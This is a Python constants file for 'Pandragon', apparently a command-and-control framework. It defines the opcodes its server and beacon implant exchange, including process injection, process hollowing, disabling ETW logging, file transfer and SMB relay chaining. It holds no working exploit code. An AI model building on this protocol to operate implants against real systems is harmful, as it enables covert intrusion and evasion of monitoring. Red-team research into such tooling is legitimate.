"""
Pandragon Protocol Constants

Protocol-wide constants for the encrypted binary protocol.
"""

# =============================================================================
# Protocol Constants
# =============================================================================

PANDRAGON_MAGIC = 0x50414E44  # "PAND" in ASCII, little-endian
HEADER_LEN = 46  # 4+1+8+1+4+24+4 = 46 bytes (no padding_flags field)
MAC_LEN = 16

# =============================================================================
# Opcode Definitions
# =============================================================================


class S2BOpcode:
    """Server-to-Beacon opcodes (must match Beacon/include/network/net_abstract.h)"""
    NO_TASKS            = 0x00
    ECHO                = 0x01
    SLEEP               = 0x02
    FILE_READ           = 0x04
    DIE                 = 0xFF
    BOF_EXEC            = 0x10
    BOF_FREE            = 0x11
    LONG_RUNNING_BOF    = 0x14
    ROTATE_KEY          = 0x1E
    FILE_DOWNLOAD_START = 0x20
    FILE_DOWNLOAD_CHUNK = 0x21
    FILE_UPLOAD_START   = 0x22
    FILE_UPLOAD_CHUNK   = 0x23
    ETW_ENABLE          = 0x25
    ETW_DISABLE         = 0x26
    INJECT_PROCESS      = 0x30
    MIGRATE             = 0x31
    HOLLOW_PROCESS      = 0x32
    # Relay opcodes (P2P SMB beacon)
    START_RELAY         = 0x40
    STOP_RELAY          = 0x41
    RELAY_ADD_CHILD     = 0x42
    RELAY_REMOVE_CHILD  = 0x43
    RELAY_DOWN          = 0x44


class B2SOpcode:
    """Beacon-to-Server opcodes (must match Beacon/include/network/net_abstract.h)"""
    BEACON_CHECK_IN    = 0x01
    BEACON_POLL        = 0x02
    BEACON_TASK_RESULT = 0x03
    BEACON_ERROR       = 0x04
    # Extended opcodes (legacy - single packet)
    FILE_CONTENT       = 0x10  # Legacy: file read result (small files)
    FILE_WRITE_RESULT  = 0x11  # Legacy: file write confirmation
    BOF_OUTPUT        = 0x12
    LIST_FILES_RESULT  = 0x13  # Directory listing result
    # Key rotation acknowledgement
    KEY_ROTATE_ACK     = 0x1F  # Beacon -> Server: key rotation confirmed
    # Chunked file transfer opcodes
    FILE_DOWNLOAD_ACK  = 0x20  # Beacon -> Server: download started/failed
    FILE_CHUNK_DATA    = 0x21  # Beacon -> Server: file chunk data
    FILE_UPLOAD_ACK    = 0x22  # Beacon -> Server: chunk written/failed
    # Relay opcodes (P2P SMB beacon)
    RELAY_CHILD_UP     = 0x40  # Parent -> Server: child data upstream


# Opcode name mappings for debugging
S2B_OPCODE_NAMES = {
    S2BOpcode.NO_TASKS: "NO_TASKS",
    S2BOpcode.ECHO: "ECHO",
    S2BOpcode.SLEEP: "SLEEP",
    S2BOpcode.FILE_READ: "FILE_READ",
    S2BOpcode.DIE: "DIE",
    S2BOpcode.BOF_EXEC: "BOF_EXEC",
    S2BOpcode.BOF_FREE: "BOF_FREE",
    S2BOpcode.LONG_RUNNING_BOF: "LONG_RUNNING_BOF",
    S2BOpcode.ROTATE_KEY: "ROTATE_KEY",
    S2BOpcode.FILE_DOWNLOAD_START: "FILE_DOWNLOAD_START",
    S2BOpcode.FILE_DOWNLOAD_CHUNK: "FILE_DOWNLOAD_CHUNK",
    S2BOpcode.FILE_UPLOAD_START: "FILE_UPLOAD_START",
    S2BOpcode.FILE_UPLOAD_CHUNK: "FILE_UPLOAD_CHUNK",
    S2BOpcode.ETW_ENABLE: "ETW_ENABLE",
    S2BOpcode.ETW_DISABLE: "ETW_DISABLE",
    S2BOpcode.INJECT_PROCESS: "INJECT_PROCESS",
    S2BOpcode.MIGRATE: "MIGRATE",
    S2BOpcode.HOLLOW_PROCESS: "HOLLOW_PROCESS",
    S2BOpcode.START_RELAY: "START_RELAY",
    S2BOpcode.STOP_RELAY: "STOP_RELAY",
    S2BOpcode.RELAY_ADD_CHILD: "RELAY_ADD_CHILD",
    S2BOpcode.RELAY_REMOVE_CHILD: "RELAY_REMOVE_CHILD",
    S2BOpcode.RELAY_DOWN: "RELAY_DOWN",
}

B2S_OPCODE_NAMES = {
    B2SOpcode.BEACON_CHECK_IN: "BEACON_CHECK_IN",
    B2SOpcode.BEACON_POLL: "BEACON_POLL",
    B2SOpcode.BEACON_TASK_RESULT: "BEACON_TASK_RESULT",
    B2SOpcode.BEACON_ERROR: "BEACON_ERROR",
    B2SOpcode.FILE_CONTENT: "FILE_CONTENT",
    B2SOpcode.FILE_WRITE_RESULT: "FILE_WRITE_RESULT",
    B2SOpcode.BOF_OUTPUT: "BOF_OUTPUT",
    B2SOpcode.LIST_FILES_RESULT: "LIST_FILES_RESULT",
    B2SOpcode.KEY_ROTATE_ACK: "KEY_ROTATE_ACK",
    B2SOpcode.FILE_DOWNLOAD_ACK: "FILE_DOWNLOAD_ACK",
    B2SOpcode.FILE_CHUNK_DATA: "FILE_CHUNK_DATA",
    B2SOpcode.FILE_UPLOAD_ACK: "FILE_UPLOAD_ACK",
    B2SOpcode.RELAY_CHILD_UP: "RELAY_CHILD_UP",
}


def get_s2b_opcode_name(opcode: int) -> str:
    """Get human-readable name for server-to-beacon opcode"""
    return S2B_OPCODE_NAMES.get(opcode, f"UNKNOWN(0x{opcode:02x})")


def get_b2s_opcode_name(opcode: int) -> str:
    """Get human-readable name for beacon-to-server opcode"""
    return B2S_OPCODE_NAMES.get(opcode, f"UNKNOWN(0x{opcode:02x})")
